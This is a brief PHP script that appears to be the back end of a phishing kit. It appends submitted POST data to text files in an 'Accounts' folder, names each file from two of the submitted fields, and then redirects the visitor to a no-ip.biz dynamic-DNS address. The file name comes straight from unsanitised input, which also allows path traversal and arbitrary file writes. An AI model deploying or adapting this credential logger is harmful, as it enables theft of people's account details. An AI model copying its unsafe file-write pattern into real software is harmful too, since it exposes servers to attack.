<?php
    if(isset($_POST['field1']) && isset($_POST['field2']) && isset($_POST['field3'])) {
        $data = $_POST['field3'] . " \n";
		$filename = "Accounts/" . $_POST['field1'] . '-' . $_POST['field2'] . ".txt";
        $ret = file_put_contents($filename, $data, FILE_APPEND | LOCK_EX);
        if($ret === false) {
            die('There was an error writing this file');
        }
        else {
            echo "$ret bytes written to file";
        }
    }
    else {
        die('no post data to process');
    }

	header( 'Location: https://undtrekie.no-ip.biz/' ) ;

?>
